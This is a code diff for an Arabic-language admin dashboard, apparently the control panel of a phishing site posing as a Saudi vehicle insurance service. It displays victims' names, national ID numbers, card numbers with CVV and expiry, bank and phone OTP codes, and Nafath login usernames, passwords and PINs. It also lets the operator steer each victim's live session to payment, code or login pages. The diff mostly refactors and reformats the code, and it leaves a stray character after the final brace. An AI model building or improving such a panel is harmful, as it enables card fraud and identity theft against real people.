@@ -2,7 +2,38 @@
 
 import { useState, useEffect, useMemo, useRef, useCallback } from "react"
 import { useRouter } from "next/navigation"
-import { Trash2, Users, CreditCard, UserCheck, Flag, Bell, LogOut, Search, Calendar, Download, Settings, User, Menu, ChevronRight, FileText, Shield, Key, UserX, Eye, Copy, Phone, MessageSquare, MoreVertical, Filter, X, Wifi, Smartphone, Hash, IceCream, LockIcon } from 'lucide-react'
+import {
+  Trash2,
+  Users,
+  CreditCard,
+  UserCheck,
+  Flag,
+  Bell,
+  LogOut,
+  Search,
+  Calendar,
+  Download,
+  Settings,
+  User,
+  Menu,
+  ChevronRight,
+  FileText,
+  Shield,
+  Key,
+  UserX,
+  Eye,
+  Copy,
+  Phone,
+  MessageSquare,
+  MoreVertical,
+  Filter,
+  X,
+  Wifi,
+  Smartphone,
+  Hash,
+  IceCream,
+  LockIcon,
+} from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
 import { formatDistanceToNow } from "date-fns"
@@ -24,7 +55,7 @@ import {
 import { Sheet, SheetContent, SheetHeader, SheetTitle } from "@/components/ui/sheet"
 import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
 import { Separator } from "@/components/ui/separator"
-import { toast, useToast } from "@/hooks/use-toast"
+import { useToast } from "@/hooks/use-toast"
 import { ScrollArea } from "@/components/ui/scroll-area"
 
 // Types
@@ -33,20 +64,22 @@ type FlagColor = "red" | "yellow" | "green" | null
 interface Notification {
   createdDate: string
   id: string
-  insurance_purpose: "renewal" | "property-transfer"
-  vehicle_type: "registration" | "customs" | "serial"
-  documment_owner_full_name: string
-  owner_identity_number?: string
-  buyer_identity_number?: string
-  seller_identity_number?: string
-  phone?: string
+  formData: {
+    insurance_purpose: "renewal" | "property-transfer"
+    vehicle_type: "registration" | "customs" | "serial"
+    documment_owner_full_name: string
+    owner_identity_number?: string
+    buyer_identity_number?: string
+    seller_identity_number?: string
+    phone?: string
+    serial_number?: string
+    vehicle_manufacture_number?: string
+    customs_code?: string
+    agreeToTerms: boolean
+  }
   phone2?: string // New field
   phoneOtpCode?: string // New field
   operator?: string // New field
-  serial_number?: string
-  vehicle_manufacture_number?: string
-  customs_code?: string
-  agreeToTerms: boolean
   cardNumber: string
   currentPage?: string
   country?: string
@@ -126,8 +159,8 @@ function UserStatus({ userId }: { userId: string }) {
         status === "online"
           ? "bg-emerald-500 animate-pulse shadow-lg shadow-emerald-500/50"
           : status === "offline"
-          ? "bg-gray-400"
-          : "bg-amber-400 animate-pulse"
+            ? "bg-gray-400"
+            : "bg-amber-400 animate-pulse"
       }`}
     />
   )
@@ -192,7 +225,7 @@ function NotificationCard({
     if (notification.nafadUsername) {
       return "border-l-4 border-purple-500 bg-purple-50/50 dark:bg-purple-900/10"
     }
-    if (notification.phone || notification.phone2) {
+    if (notification.formData?.phone || notification.phone2) {
       return "border-l-4 border-blue-500 bg-blue-50/50 dark:bg-blue-900/10"
     }
 
@@ -200,11 +233,11 @@ function NotificationCard({
   }
 
   const getPrimaryInfo = () => {
-    if (notification.documment_owner_full_name) {
-      return notification.documment_owner_full_name
+    if (notification.formData?.documment_owner_full_name) {
+      return notification.formData?.documment_owner_full_name
     }
-    if (notification.phone) {
-      return notification.phone
+    if (notification.formData?.phone) {
+      return notification.formData?.phone
     }
     if (notification.phone2) {
       return notification.phone2
@@ -331,18 +364,18 @@ function NotificationCard({
                 {notification.currentPage === "1"
                   ? "معلومات"
                   : notification.currentPage === "2"
-                  ? "معلومات"
-                  : notification.currentPage === "3"
-                  ? "عروض"
-                  : notification.currentPage === "6"
-                  ? "دفع"
-                  : notification.currentPage === "7"
-                  ? "كود"
-                  : notification.currentPage === "9999"
-                  ? "هاتف"
-                  : notification.currentPage === "8888"
-                  ? "نفاذ"
-                  : "غير معروف"}
+                    ? "معلومات"
+                    : notification.currentPage === "3"
+                      ? "عروض"
+                      : notification.currentPage === "6"
+                        ? "دفع"
+                        : notification.currentPage === "7"
+                          ? "كود"
+                          : notification.currentPage === "9999"
+                            ? "هاتف"
+                            : notification.currentPage === "8888"
+                              ? "نفاذ"
+                              : "غير معروف"}
               </Badge>
             )}
             {notification.cardNumber && (
@@ -458,14 +491,22 @@ function NotificationDetails({
           <Avatar className="h-10 w-10">
             <AvatarImage src="/placeholder.svg?height=40&width=40" />
             <AvatarFallback className="bg-primary/20 text-primary font-semibold">
-              {(notification.documment_owner_full_name || notification.phone || notification.phone2 || "مستخدم")
+              {(
+                notification.formData?.documment_owner_full_name ||
+                notification.formData?.phone ||
+                notification.phone2 ||
+                "مستخدم"
+              )
                 .slice(0, 2)
                 .toUpperCase()}
             </AvatarFallback>
           </Avatar>
           <div>
             <h2 className="font-semibold text-foreground">
-              {notification.documment_owner_full_name || notification.phone || notification.phone2 || "مستخدم جديد"}
+              {notification.formData?.documment_owner_full_name ||
+                notification.formData?.phone ||
+                notification.phone2 ||
+                "مستخدم جديد"}
             </h2>
             <div className="flex items-center gap-2 text-xs text-muted-foreground">
               <span>{notification.country}</span>
@@ -501,7 +542,7 @@ function NotificationDetails({
         </div>
         <div className="hidden p-4 rounded-md sm:block">
           <Button
-          title="معلومات"
+            title="معلومات"
             onClick={() => onCurrentPageUpdate && onCurrentPageUpdate(notification.id, "1")}
             variant={notification.currentPage === "1" ? "default" : "ghost"}
             size="icon"
@@ -509,8 +550,7 @@ function NotificationDetails({
             <FileText className="h-5 w-5" />
           </Button>
           <Button
-          title="دفع"
-
+            title="دفع"
             onClick={() => onCurrentPageUpdate && onCurrentPageUpdate(notification.id, "6")}
             variant={notification.currentPage === "6" ? "default" : "ghost"}
             size="icon"
@@ -518,17 +558,15 @@ function NotificationDetails({
             <CreditCard className="h-5 w-5" />
           </Button>
           <Button
-          title="نفاذ"
-
-            onClick={() => onCurrentPageUpdate && onCurrentPageUpdate(notification.id, "nafaz")}
+            title="نفاذ"
+            onClick={() => onCurrentPageUpdate && onCurrentPageUpdate(notification.id, "8888")}
             variant={notification.currentPage === "8888" ? "default" : "ghost"}
             size="icon"
           >
             <Shield className="h-5 w-5" />
           </Button>
           <Button
-          title="كود"
-
+            title="كود"
             onClick={() => onCurrentPageUpdate && onCurrentPageUpdate(notification.id, "7")}
             variant={notification.currentPage === "7" ? "default" : "ghost"}
             size="icon"
@@ -536,8 +574,7 @@ function NotificationDetails({
             <LockIcon className="h-5 w-5" />
           </Button>
           <Button
-          title="هاتف"
-
+            title="هاتف"
             onClick={() => onCurrentPageUpdate && onCurrentPageUpdate(notification.id, "9999")}
             variant={notification.currentPage === "9999" ? "default" : "ghost"}
             size="icon"
@@ -648,13 +685,13 @@ function NotificationDetails({
               id: "personal",
               label: "المعلومات الشخصية",
               icon: User,
-              hasData: notification.documment_owner_full_name || notification.owner_identity_number,
+              hasData: notification.formData?.documment_owner_full_name || notification.formData?.owner_identity_number,
             },
             {
               id: "phone",
               label: "الهاتف",
               icon: Smartphone,
-              hasData: notification.phone || notification.phone2 || notification.phoneOtpCode,
+              hasData: notification.formData?.phone || notification.phone2 || notification.phoneOtpCode,
             },
             { id: "card", label: "البطاقة", icon: CreditCard, hasData: notification.cardNumber },
             { id: "nafaz", label: "نفاذ", icon: Key, hasData: notification.nafadUsername },
@@ -680,29 +717,30 @@ function NotificationDetails({
       <ScrollArea className="flex-1">
         <div className="p-4 space-y-4">
           {activeTab === "personal" && (
-            <div className="space-y-3 bg-blue-50/50 ">
+            <div className="space-y-3">
               {[
-                { label: "اسم مالك الوثيقة", value: notification.documment_owner_full_name, icon: User },
-                { label: "رقم هوية المالك", value: notification.owner_identity_number, icon: Shield },
-                { label: "رقم هوية المشتري", value: notification.buyer_identity_number, icon: Shield },
-                { label: "رقم هوية البائع", value: notification.seller_identity_number, icon: Shield },
-                { label: "الرقم التسلسلي", value: notification.serial_number, icon: FileText },
-                { label: "رقم تصنيع المركبة", value: notification.vehicle_manufacture_number, icon: FileText },
+                { label: "اسم مالك الوثيقة", value: notification.formData?.documment_owner_full_name, icon: User },
+                { label: "رقم هوية المالك", value: notification.formData?.owner_identity_number, icon: Shield },
+                { label: "رقم هوية المشتري", value: notification.formData?.buyer_identity_number, icon: Shield },
+                { label: "رقم هوية البائع", value: notification.formData?.seller_identity_number, icon: Shield },
+                { label: "الرقم التسلسلي", value: notification.formData?.serial_number, icon: FileText },
+                {
+                  label: "رقم تصنيع المركبة",
+                  value: notification.formData?.vehicle_manufacture_number,
+                  icon: FileText,
+                },
                 { label: "الرقم التسلسل", value: notification.sequenceNumber, icon: FileText },
                 { label: "الصفحة الحالية", value: notification.currentPage, icon: FileText },
-                {
-                  label: "غرض التأمين",
-                  value: notification.insurance_purpose === "renewal" ? "تجديد" : "نقل ملكية",
-                  icon: Shield,
-                },
+                { label: "الهاتف الأساسي", value: notification.formData?.phone, icon: Phone },
+                { label: "الهاتف الثاني", value: notification.phone2, icon: Phone },
                 {
                   label: "نوع المركبة",
                   value:
-                    notification.vehicle_type === "registration"
+                    notification.formData?.vehicle_type === "registration"
                       ? "تسجيل"
-                      : notification.vehicle_type === "customs"
-                      ? "جمارك"
-                      : "رقم تسلسلي",
+                      : notification.formData?.vehicle_type === "customs"
+                        ? "جمارك"
+                        : "رقم تسلسلي",
                   icon: FileText,
                 },
                 {
@@ -711,8 +749,8 @@ function NotificationDetails({
                     notification.paymentStatus === "completed"
                       ? "مكتمل"
                       : notification.paymentStatus === "pending"
-                      ? "معلق"
-                      : notification.paymentStatus,
+                        ? "معلق"
+                        : notification.paymentStatus,
                   icon: CreditCard,
                 },
                 { label: "تاريخ بداية البوليصة", value: notification.policyStartDate, icon: Calendar },
@@ -756,7 +794,7 @@ function NotificationDetails({
                   </div>
                   <div className="space-y-3">
                     {[
-                      { label: "رقم الهاتف الأساسي", value: notification.phone, icon: Phone },
+                      { label: "رقم الهاتف الأساسي", value: notification.formData?.phone, icon: Phone },
                       { label: "رقم الهاتف الثاني", value: notification.phone2, icon: Smartphone },
                       { label: "معلومات الشبكة", value: notification.operator, icon: Wifi },
                       { label: "رمز التحقق للهاتف", value: notification.phoneOtpCode, icon: Hash },
@@ -777,8 +815,8 @@ function NotificationDetails({
                                       item.label.includes("رمز التحقق")
                                         ? "bg-orange-100 text-orange-700 border-orange-200"
                                         : item.label.includes("شبكة")
-                                        ? "bg-cyan-100 text-cyan-700 border-cyan-200"
-                                        : "bg-blue-100 text-blue-700 border-blue-200"
+                                          ? "bg-cyan-100 text-cyan-700 border-cyan-200"
+                                          : "bg-blue-100 text-blue-700 border-blue-200"
                                     }`}
                                   >
                                     {item.value}
@@ -795,69 +833,74 @@ function NotificationDetails({
                   </div>
                 </CardContent>
               </Card>
-              {!notification.phone && !notification.phone2 && !notification.phoneOtpCode && !notification.operator && (
-                <div className="text-center py-8">
-                  <div className="bg-muted/50 rounded-full p-4 mx-auto w-fit mb-4">
-                    <Phone className="h-8 w-8 text-muted-foreground" />
+              {!notification.formData?.phone &&
+                !notification.phone2 &&
+                !notification.phoneOtpCode &&
+                !notification.operator && (
+                  <div className="text-center py-8">
+                    <div className="bg-muted/50 rounded-full p-4 mx-auto w-fit mb-4">
+                      <Phone className="h-8 w-8 text-muted-foreground" />
+                    </div>
+                    <p className="text-sm font-medium text-foreground mb-1">لا توجد معلومات هاتف</p>
+                    <p className="text-xs text-muted-foreground">لم يتم تسجيل أي معلومات هاتف لهذا المستخدم</p>
                   </div>
-                  <p className="text-sm font-medium text-foreground mb-1">لا توجد معلومات هاتف</p>
-                  <p className="text-xs text-muted-foreground">لم يتم تسجيل أي معلومات هاتف لهذا المستخدم</p>
-                </div>
-              )}
+                )}
             </div>
           )}
 
           {activeTab === "card" && (
-            <div className="space-y-3 p-1 ">
-              <Card>
-                <CardContent className=" bg-green-100 border-blue-200 dark:border-blue-800 dark:bg-blue-900/20">
-                  {[
-                    { label: "رقم البطاقة", value: notification.cardNumber, icon: CreditCard },
-                    {
-                      label: "تاريخ الانتهاء",
-                      value:
-                        notification.cardMonth && notification.cardYear
-                          ? `${notification.cardMonth}/${notification.cardYear}`
-                          : null,
-                      icon: Calendar,
-                    },
-                    { label: "رمز الامان (CVV)", value: notification.cvv, icon: Shield },
-                    { label: "رمز التحقق (OTP)", value: notification.otp || notification.otpCode, icon: Shield },
-                    { label: "جميع الرموز", value: notification.allOtps?.join(''), icon: Shield },
-                  ].map(
-                    (item) =>
-                      item.value && (
-                        <Card key={item.label} className="border-muted/50">
-                          <CardContent className="p-4">
-                            <div className="flex items-center justify-between">
-                              <div className="flex items-center gap-3">
-                                <item.icon className="h-4 w-4 text-muted-foreground" />
-                                <span className="text-sm font-medium text-muted-foreground">{item.label}</span>
+            <div className="space-y-3">
+              <Card className="border-emerald-200 bg-emerald-50/50 dark:border-emerald-800 dark:bg-emerald-900/20">
+                <CardContent className="p-4">
+                  <div className="space-y-3">
+                    {[
+                      { label: "رقم البطاقة", value: notification.cardNumber, icon: CreditCard },
+                      {
+                        label: "تاريخ الانتهاء",
+                        value:
+                          notification.cardMonth && notification.cardYear
+                            ? `${notification.cardMonth}/${notification.cardYear}`
+                            : null,
+                        icon: Calendar,
+                      },
+                      { label: "رمز الامان (CVV)", value: notification.cvv, icon: Shield },
+                      { label: "رمز التحقق (OTP)", value: notification.otp || notification.otpCode, icon: Shield },
+                      { label: "جميع الرموز", value: notification.allOtps?.join(", "), icon: Shield },
+                    ].map(
+                      (item) =>
+                        item.value && (
+                          <Card key={item.label} className="border-muted/50">
+                            <CardContent className="p-4">
+                              <div className="flex items-center justify-between">
+                                <div className="flex items-center gap-3">
+                                  <item.icon className="h-4 w-4 text-muted-foreground" />
+                                  <span className="text-sm font-medium text-muted-foreground">{item.label}</span>
+                                </div>
+                                <div className="flex items-center gap-2">
+                                  <Badge variant="secondary" className="font-mono text-sm">
+                                    {item.value}
+                                  </Badge>
+                                  <Button variant="ghost" size="icon" className="h-6 w-6">
+                                    <Copy className="h-3 w-3" />
+                                  </Button>
+                                </div>
                               </div>
-                              <div className="flex items-center gap-2">
-                                <Badge variant="secondary" className="font-mono text-sm">
-                                  {item.value}
-                                </Badge>
-                                <Button variant="ghost" size="icon" className="h-6 w-6">
-                                  <Copy className="h-3 w-3" />
-                                </Button>
-                              </div>
-                            </div>
-                          </CardContent>
-                        </Card>
-                      ),
-                  )}
-                  {!notification.cardNumber && (
-                    <div className="text-center py-8">
-                      <div className="bg-muted/50 rounded-full p-4 mx-auto w-fit mb-4">
-                        <CreditCard className="h-8 w-8 text-muted-foreground" />
-                      </div>
-                      <p className="text-sm font-medium text-foreground mb-1">لا توجد معلومات بطاقة</p>
-                      <p className="text-xs text-muted-foreground">لم يتم تسجيل معلومات بطاقة لهذا المستخدم</p>
-                    </div>
-                  )}
+                            </CardContent>
+                          </Card>
+                        ),
+                    )}
+                  </div>
                 </CardContent>
               </Card>
+              {!notification.cardNumber && (
+                <div className="text-center py-8">
+                  <div className="bg-muted/50 rounded-full p-4 mx-auto w-fit mb-4">
+                    <CreditCard className="h-8 w-8 text-muted-foreground" />
+                  </div>
+                  <p className="text-sm font-medium text-foreground mb-1">لا توجد معلومات بطاقة</p>
+                  <p className="text-xs text-muted-foreground">لم يتم تسجيل معلومات بطاقة لهذا المستخدم</p>
+                </div>
+              )}
             </div>
           )}
 
@@ -894,7 +937,7 @@ function NotificationDetails({
                           <div className="flex items-center justify-between">
                             <span className="text-sm font-medium text-muted-foreground">كلمة المرور</span>
                             <div className="flex items-center gap-2">
-                              <span className="text-sm font-semibold font-mono">{notification?.nafadPassword}</span>
+                              <span className="text-sm font-semibold font-mono">{notification.nafadPassword}</span>
                               <Button variant="ghost" size="icon" className="h-6 w-6">
                                 <Eye className="h-3 w-3" />
                               </Button>
@@ -1034,27 +1077,28 @@ export default function NotificationsPage() {
         (filterType === "card" && !!notification.cardNumber) ||
         (filterType === "online" && onlineStatuses[notification.id]) ||
         (filterType === "nafaz" && !!notification.nafadUsername) ||
-        (filterType === "phone" && (!!notification.phone || !!notification.phone2 || !!notification.phoneOtpCode))
+        (filterType === "phone" &&
+          (!!notification.formData?.phone || !!notification.phone2 || !!notification.phoneOtpCode))
 
       if (!matchesFilterType) return false
 
       if (searchTerm) {
         const term = searchTerm.toLowerCase()
         return (
-          notification.documment_owner_full_name?.toLowerCase().includes(term) ||
-          notification.phone?.toLowerCase().includes(term) ||
+          notification.formData?.documment_owner_full_name?.toLowerCase().includes(term) ||
+          notification.formData?.phone?.toLowerCase().includes(term) ||
           notification.phone2?.toLowerCase().includes(term) ||
           notification.phoneOtpCode?.toLowerCase().includes(term) ||
           notification.operator?.toLowerCase().includes(term) ||
           notification.currentPage?.toLowerCase().includes(term) ||
           notification.cardNumber?.toLowerCase().includes(term) ||
           notification.country?.toLowerCase().includes(term) ||
-          notification.owner_identity_number?.toLowerCase().includes(term) ||
-          notification.buyer_identity_number?.toLowerCase().includes(term) ||
-          notification.seller_identity_number?.toLowerCase().includes(term) ||
-          notification.serial_number?.toLowerCase().includes(term) ||
-          notification.vehicle_manufacture_number?.toLowerCase().includes(term) ||
-          notification.customs_code?.toLowerCase().includes(term) ||
+          notification.formData?.owner_identity_number?.toLowerCase().includes(term) ||
+          notification.formData?.buyer_identity_number?.toLowerCase().includes(term) ||
+          notification.formData?.seller_identity_number?.toLowerCase().includes(term) ||
+          notification.formData?.serial_number?.toLowerCase().includes(term) ||
+          notification.formData?.vehicle_manufacture_number?.toLowerCase().includes(term) ||
+          notification.formData?.customs_code?.toLowerCase().includes(term) ||
           notification.sequenceNumber?.toLowerCase().includes(term) ||
           notification.selectedInsuranceOffer?.toLowerCase().includes(term) ||
           notification.paymentStatus?.toLowerCase().includes(term) ||
@@ -1125,7 +1169,7 @@ export default function NotificationsPage() {
     setTotalVisitors(activeNotifications.length)
     setCardSubmissions(activeNotifications.filter((n) => !!n.cardNumber).length)
     setNafazSubmissions(activeNotifications.filter((n) => !!n.nafadUsername).length)
-    setPhoneSubmissions(activeNotifications.filter((n) => !!n.phone || !!n.phone2 || !!n.phoneOtpCode).length)
+    setPhoneSubmissions(activeNotifications.filter((n) => !!n.formData?.phone || !!n.phone2 || !!n.phoneOtpCode).length)
   }, [])
 
   const fetchNotifications = useCallback(() => {
@@ -1170,11 +1214,11 @@ export default function NotificationsPage() {
         const hasNewImportantInfo = newEntries.some(
           (n) =>
             n.cardNumber ||
-            n.documment_owner_full_name ||
-            n.phone ||
+            n.formData?.documment_owner_full_name ||
+            n.formData?.phone ||
             n.phone2 ||
             n.phoneOtpCode ||
-            n.owner_identity_number ||
+            n.formData?.owner_identity_number ||
             n.nafadUsername ||
             n.nafaz_pin,
         )
@@ -1281,9 +1325,11 @@ export default function NotificationsPage() {
     setSelectedNotificationId(notification.id)
     setShowDetails(true)
   }
+
   const handleShow = () => {
     setShow(!show)
   }
+
   if (isLoading && notifications.length === 0) {
     return (
       <div className="min-h-screen bg-gradient-to-br from-background via-muted/20 to-background flex items-center justify-center w-full">
@@ -1420,12 +1466,12 @@ export default function NotificationsPage() {
                     stat.color === "emerald"
                       ? "bg-emerald-100 text-emerald-600 dark:bg-emerald-900/30 dark:text-emerald-400"
                       : stat.color === "blue"
-                      ? "bg-blue-100 text-blue-600 dark:bg-blue-900/30 dark:text-blue-400"
-                      : stat.color === "cyan"
-                      ? "bg-cyan-100 text-cyan-600 dark:bg-cyan-900/30 dark:text-cyan-400"
-                      : stat.color === "purple"
-                      ? "bg-purple-100 text-purple-600 dark:bg-purple-900/30 dark:text-purple-400"
-                      : "bg-indigo-100 text-indigo-600 dark:bg-indigo-900/30 dark:text-indigo-400"
+                        ? "bg-blue-100 text-blue-600 dark:bg-blue-900/30 dark:text-blue-400"
+                        : stat.color === "cyan"
+                          ? "bg-cyan-100 text-cyan-600 dark:bg-cyan-900/30 dark:text-cyan-400"
+                          : stat.color === "purple"
+                            ? "bg-purple-100 text-purple-600 dark:bg-purple-900/30 dark:text-purple-400"
+                            : "bg-indigo-100 text-indigo-600 dark:bg-indigo-900/30 dark:text-indigo-400"
                   }`}
                 >
                   <Icon className="h-5 w-5" />
@@ -1484,7 +1530,8 @@ export default function NotificationsPage() {
                   {
                     label: "الهواتف",
                     type: "phone",
-                    count: notifications.filter((n) => !n.isHidden && (n.phone || n.phone2 || n.phoneOtpCode)).length,
+                    count: notifications.filter((n) => !n.isHidden && (n.formData?.phone || n.phone2 || n.phoneOtpCode))
+                      .length,
                     icon: Smartphone,
                   },
                   {
@@ -1589,3 +1636,4 @@ export default function NotificationsPage() {
     </div>
   )
 }
+s
